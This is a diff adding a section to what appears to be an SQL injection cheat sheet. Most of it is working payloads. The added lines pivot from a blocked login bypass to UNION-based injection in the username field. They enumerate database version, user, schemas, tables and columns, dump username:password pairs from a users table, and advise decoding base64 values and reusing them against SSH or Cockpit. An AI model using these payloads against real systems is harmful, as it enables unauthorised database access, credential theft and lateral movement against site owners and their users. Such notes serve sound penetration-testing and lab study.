@@ -118,6 +118,38 @@ SELECT * FROM logins WHERE username='admin' OR '1'='1'-- -' AND password='anythi
 
 Since `'1'='1'` is always true, authentication is bypassed.
 
+### When Auth Bypass Payloads Get Blocked
+
+If classic login bypasses get blocked but a single quote still produces a database error, continue testing the same parameter for UNION injection instead of stopping at auth bypass.
+
+```http
+username=admin'&password=admin
+# SQL syntax error without triggering the block page
+```
+
+Use the username field as the injection point and keep the password boring:
+
+```sql
+' ORDER BY 2-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT 1,2,3,4,5-- -
+```
+
+Once a visible column is identified, enumerate normally:
+
+```sql
+' UNION SELECT 1,@@version,3,4,5-- -
+' UNION SELECT 1,user(),3,4,5-- -
+' UNION SELECT 1,database(),3,4,5-- -
+' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
+' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='database_name'-- -
+' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,CONCAT(username,':',password),3,4,5 FROM users-- -
+```
+
+If the dumped values look like base64 (`A-Z`, `a-z`, `0-9`, `+`, `/`, often ending in `=`), decode and try them against other exposed services such as SSH or Cockpit.
+
 ---
 
 ## UNION Injection
